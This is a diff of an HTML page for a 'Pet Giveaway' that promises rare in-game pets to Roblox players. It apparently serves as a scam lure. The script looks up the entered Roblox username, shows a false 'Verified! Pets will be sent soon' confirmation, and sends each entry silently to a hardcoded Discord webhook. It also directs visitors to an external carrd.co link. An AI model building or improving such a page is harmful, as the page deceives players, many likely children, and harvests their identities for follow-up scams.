@@ -1,131 +1,170 @@
-<!DOCTYPE html>  <html lang="en">  
-<head>  
-  <meta charset="UTF-8" />  
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>  
-  <title>Pet Giveaway</title>  
-  <style>  
-    body {  
-      background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRZQ5GG1BDHG80jzNDJRWhN7EWOnc--hk5MYQFk3tC1ybEurpbMmowfWWg&s=10') no-repeat center center fixed;  
-      background-size: cover;  
-      font-family: Arial, sans-serif;  
-      color: white;  
-      text-align: center;  
-      padding: 20px;  
-    }  
-    .container {  
-      background-color: rgba(0, 0, 0, 0.7);  
-      border-radius: 12px;  
-      padding: 20px;  
-      max-width: 500px;  
-      margin: auto;  
-    }  
-    img.pet {  
-      width: 150px;  
-      border-radius: 10px;  
-    }  
-    .avatar {  
-      margin-top: 15px;  
-    }  
-    #confirmation {  
-      display: none;  
-      margin-top: 20px;  
-      padding: 15px;  
-      background-color: #28a745;  
-      border-radius: 10px;  
-      color: white;  
-    }  
-    input, button {  
-      padding: 10px;  
-      margin-top: 10px;  
-      font-size: 16px;  
-      border-radius: 8px;  
-      border: none;  
-    }  
-    button {  
-      background-color: #00b894;  
-      color: white;  
-      cursor: pointer;  
-    }  
-    button:hover {  
-      background-color: #019875;  
-    }  
-  </style>  
-</head>  
-<body>  
-  <div class="container">  
-    <h1>🎁 Pet Giveaway</h1>  
-    <p>Click on link to join live server giveaway → <a href="https://growagardenserver.carrd.co" target="_blank">growagardenserver.carrd.co</a></p>  <h2>🎁 Pets</h2>  
-<div>  
-  <p><strong>Raccoon</strong> - Rarity: Rare</p>  
-  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRDpb6oYHh0OnNavALI-aLfRiHUO3vM6heMQQ&s" class="pet" />  
-  <p><strong>Kitsune</strong> - Rarity: Rare</p>  
-  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVzQ1aBn_CVNcn0LM2lUpA5fMa-CjMucl7eg&s" class="pet" />  
-  <p><strong>Disco Bee</strong> - Rarity: Rare</p>  
-  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ5hxIq8A9X1oLZ87I4pH0QOwYFLAbxnB85PA&s" class="pet" />  
-  <p><strong>Butterfly</strong> - Rarity: Rare</p>  
-  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWhyGKkPY82zZSmTyMUv2lTV0MYzKnD5Bvb0-FaM5_Tw&s" class="pet" />  
-</div>  
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Pet Giveaway</title>
+  <style>
+    body {
+      background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRZQ5GG1BDHG80jzNDJRWhN7EWOnc--hk5MYQFk3tC1ybEurpbMmowfWWg&s=10') no-repeat center center fixed;
+      background-size: cover;
+      font-family: Arial, sans-serif;
+      color: white;
+      text-align: center;
+      padding: 20px;
+    }
+    .container {
+      background-color: rgba(0, 0, 0, 0.75);
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 550px;
+      margin: auto;
+    }
+    .pets {
+      display: flex;
+      justify-content: space-around;
+      flex-wrap: wrap;
+      gap: 10px;
+    }
+    .pet {
+      border: 3px solid transparent;
+      border-radius: 12px;
+      padding: 5px;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+    .pet:hover {
+      border-color: #fff;
+      transform: scale(1.05);
+    }
+    .selected {
+      border-color: #00ffcc !important;
+    }
+    .pet img {
+      width: 100px;
+      height: 100px;
+      border-radius: 10px;
+    }
+    input, button {
+      padding: 10px;
+      margin-top: 10px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+    }
+    button {
+      background-color: #00b894;
+      color: white;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #019875;
+    }
+    #avatar {
+      margin-top: 15px;
+    }
+    #confirmation {
+      display: none;
+      margin-top: 20px;
+      padding: 15px;
+      background-color: #28a745;
+      border-radius: 10px;
+      color: white;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🎁 Pet Giveaway</h1>
+    <p>Click to join our live server giveaway → <a href="https://growagardenserver.carrd.co" target="_blank">growagardenserver.carrd.co</a></p>
 
-<h3>Enter Your Roblox Username</h3>  
-<input type="text" id="username" placeholder="Roblox Username" />  
-<br>  
-<button onclick="verifyUser()">Enter Giveaway</button>  
+    <h3>Choose Your Pet</h3>
+    <div class="pets" id="petList">
+      <div class="pet" data-name="Raccoon">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRDpb6oYHh0OnNavALI-aLfRiHUO3vM6heMQQ&s" alt="Raccoon"><br>
+        Raccoon
+      </div>
+      <div class="pet" data-name="Kitsune">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVzQ1aBn_CVNcn0LM2lUpA5fMa-CjMucl7eg&s" alt="Kitsune"><br>
+        Kitsune
+      </div>
+      <div class="pet" data-name="Disco Bee">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ5hxIq8A9X1oLZ87I4pH0QOwYFLAbxnB85PA&s" alt="Disco Bee"><br>
+        Disco Bee
+      </div>
+      <div class="pet" data-name="Butterfly">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWhyGKkPY82zZSmTyMUv2lTV0MYzKnD5Bvb0-FaM5_Tw&s" alt="Butterfly"><br>
+        Butterfly
+      </div>
+    </div>
 
-<div class="avatar" id="avatar"></div>  
-<div id="confirmation">✅ Verified! You've entered the giveaway. Pets will be sent soon.</div>
+    <h3>Enter Your Roblox Username</h3>
+    <input type="text" id="username" placeholder="Roblox Username" />
+    <br>
+    <button onclick="verifyUser()">Enter Giveaway</button>
 
-  </div>    <script>  
-    async function verifyUser() {  
-      const username = document.getElementById("username").value.trim();  
-      if (!username) return alert("Please enter a username.");  
-  
-      const avatarDiv = document.getElementById("avatar");  
-      avatarDiv.innerHTML = "Loading avatar...";  
-  
-      try {  
-        const res = await fetch(`https://users.roblox.com/v1/usernames/users`, {  
-          method: "POST",  
-          headers: {  
-            "Content-Type": "application/json"  
-          },  
-          body: JSON.stringify({ usernames: [username] })  
-        });  
-        const data = await res.json();  
-  
-        if (!data.data || !data.data[0]) {  
-          avatarDiv.innerHTML = "❌ User not found.";  
-          return;  
-        }  
-  
-        const userId = data.data[0].id;  
-        const displayName = data.data[0].displayName;  
-  
-        const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;  
-  
-        avatarDiv.innerHTML = `  
-          <img src="${avatarUrl}" alt="Avatar" style="border-radius: 50%;"><br>  
-          <strong>${displayName}</strong> (@${username})  
-        `;  
-  
-        document.getElementById("confirmation").style.display = "block";  
-  
-        // send to webhook  
-        const webhook = "https://discord.com/api/webhooks/1305395577650937877/anagV_7i2jzKBT87zSay-9zzDniVsyb2bLhMtY6jgFloayQ40P6ugSLbLVTDJYCMOn3T";  
-        fetch(webhook, {  
-          method: "POST",  
-          headers: { "Content-Type": "application/json" },  
-          body: JSON.stringify({  
-            content: `🎁 **New Giveaway Entry**  
-**Username:** ${username}  
-**Display Name:** ${displayName}  
-✅ Entered the giveaway.`  
-          })  
-        });  
-  
-      } catch (err) {  
-        console.error(err);  
-        avatarDiv.innerHTML = "✅ You have entered the giveaway, pls join the server in the link.";  
-      }  
-    }  
-  </script>  </body>  
+    <div id="avatar"></div>
+    <div id="confirmation">✅ Verified! You've entered the giveaway. Pets will be sent soon.</div>
+  </div>
+
+  <script>
+    let selectedPet = null;
+
+    document.querySelectorAll(".pet").forEach(pet => {
+      pet.addEventListener("click", () => {
+        document.querySelectorAll(".pet").forEach(p => p.classList.remove("selected"));
+        pet.classList.add("selected");
+        selectedPet = pet.dataset.name;
+      });
+    });
+
+    async function verifyUser() {
+      const username = document.getElementById("username").value.trim();
+      if (!username) return alert("Please enter a username.");
+      if (!selectedPet) return alert("Please select a pet.");
+
+      const avatarDiv = document.getElementById("avatar");
+      avatarDiv.innerHTML = "Loading avatar...";
+
+      try {
+        const res = await fetch("https://users.roblox.com/v1/usernames/users", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ usernames: [username] })
+        });
+        const data = await res.json();
+
+        if (!data.data || !data.data[0]) {
+          avatarDiv.innerHTML = "❌ User not found.";
+          return;
+        }
+
+        const userId = data.data[0].id;
+        const displayName = data.data[0].displayName;
+        const avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
+
+        avatarDiv.innerHTML = `
+          <img src="${avatarUrl}" alt="Avatar" style="border-radius: 50%;"><br>
+          <strong>${displayName}</strong> (@${username})<br>
+          🎁 Selected Pet: <strong>${selectedPet}</strong>
+        `;
+
+        document.getElementById("confirmation").style.display = "block";
+
+        const webhook = "https://discord.com/api/webhooks/1305395577650937877/anagV_7i2jzKBT87zSay-9zzDniVsyb2bLhMtY6jgFloayQ40P6ugSLbLVTDJYCMOn3T";
+        fetch(webhook, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            content: `🎉 **New Giveaway Entry**\n👤 **Username:** ${username}\n🔖 **Display Name:** ${displayName}\n🎁 **Selected Pet:** ${selectedPet}`
+          })
+        });
+
+      } catch (err) {
+        console.error(err);
+        avatarDiv.innerHTML = "❌ Something went wrong.";
+      }
+    }
+  </script>
+</body>
 </html>
